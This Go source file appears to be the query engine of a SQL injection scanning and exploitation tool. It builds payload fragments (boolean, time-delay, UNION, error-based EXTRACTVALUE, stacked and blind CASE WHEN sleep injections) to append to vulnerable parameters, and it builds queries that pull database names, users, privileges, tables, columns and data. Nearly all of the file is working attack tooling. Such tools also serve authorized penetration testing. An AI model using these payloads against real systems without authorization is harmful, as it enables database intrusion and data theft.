package core

import (
	"fmt"
	"strings"
)

// QueryEngine turns high-level extraction commands into SQL payload strings
// using the selected dialect. It does not execute queries by itself; it only
// builds the expressions that are inserted into payloads.
type QueryEngine struct {
	Dialect *Dialect
}

func NewQueryEngine(dbms string) *QueryEngine {
	d := GetDialect(dbms)
	if d == nil {
		d = mysqlDialect()
	}
	return &QueryEngine{Dialect: d}
}

func (q *QueryEngine) CurrentDB() string {
	return q.Dialect.CurrentDB()
}

func (q *QueryEngine) CurrentUser() string {
	return q.Dialect.User()
}

func (q *QueryEngine) Hostname() string {
	return q.Dialect.Hostname()
}

func (q *QueryEngine) Version() string {
	return q.Dialect.Version()
}

func (q *QueryEngine) Privileges() string {
	return q.Dialect.Privileges()
}

func (q *QueryEngine) IsDBA() string {
	return q.Dialect.IsDBA()
}

func (q *QueryEngine) ListDBs() string {
	return q.Dialect.Databases()
}

func (q *QueryEngine) ListTables(db string) string {
	return q.Dialect.Tables(db)
}

func (q *QueryEngine) ListColumns(db, table string) string {
	return q.Dialect.Columns(db, table)
}

func (q *QueryEngine) TableColumns(db, table string) string {
	return q.Dialect.TableColumns(db, table)
}

func (q *QueryEngine) RowCount(db, table string) string {
	return q.Dialect.RowCount(db, table)
}

func (q *QueryEngine) SearchTables(keyword string) string {
	return q.Dialect.SearchTables(keyword)
}

func (q *QueryEngine) SearchColumns(keyword string) string {
	return q.Dialect.SearchColumns(keyword)
}

func (q *QueryEngine) SearchData(db, table, whereExpr string) string {
	return fmt.Sprintf("(SELECT %s FROM %s WHERE %s)", q.ColumnsSelect(db, table), quoteTable(db, table, q.Dialect), whereExpr)
}

func (q *QueryEngine) ColumnsSelect(db, table string) string {
	return fmt.Sprintf("%s", q.Dialect.AllColumns())
}

func (q *QueryEngine) CountAllRows(db, table string) string {
	return q.Dialect.RowCount(db, table)
}

func quoteTable(db, table string, d *Dialect) string {
	return fmt.Sprintf("%s.%s", d.Quote(db), d.Quote(table))
}

// BuildPayload creates a payload fragment that can be appended to a
// vulnerable parameter value. It handles the common patterns needed by
// scanners: boolean, union, error, time, stacked.
func (q *QueryEngine) BuildPayload(mode string, details string) string {
	switch mode {
	case "boolean_true":
		return " AND 1=1--"
	case "boolean_false":
		return " AND 1=2--"
	case "time_delay":
		return fmt.Sprintf(" AND %s--", q.Dialect.SleepExpr(5))
	case "union_select":
		return fmt.Sprintf(" UNION SELECT NULL,%s,NULL FROM %s--", details, quoteTable("current", "current", q.Dialect))
	case "error_extract":
		errExpr, ok := q.Dialect.ErrorExpr(details)
		if ok {
			return fmt.Sprintf(" AND 1=%s--", errExpr)
		}
		return fmt.Sprintf(" AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--", details)
	case "stacked_select":
		return fmt.Sprintf("; SELECT %s FROM %s--", details, quoteTable("current", "current", q.Dialect))
	default:
		return fmt.Sprintf("'%s", details)
	}
}

func (q *QueryEngine) BuildBlindPayload(condition string, delay int) string {
	return fmt.Sprintf("AND CASE WHEN (%s) THEN %s ELSE 1 END--", condition, q.Dialect.SleepExpr(delay))
}

func (q *QueryEngine) BuildUnionPayload(columns int, expression string) string {
	nulls := make([]string, columns)
	for i := range nulls {
		nulls[i] = "NULL"
	}
	if expression != "" {
		nulls[0] = expression
	}
	return fmt.Sprintf(" UNION SELECT %s FROM %s--", strings.Join(nulls, ","), quoteTable("current", "current", q.Dialect))
}

func (q *QueryEngine) ExtractExpression(query string) string {
	return fmt.Sprintf("(SELECT %s)", query)
}
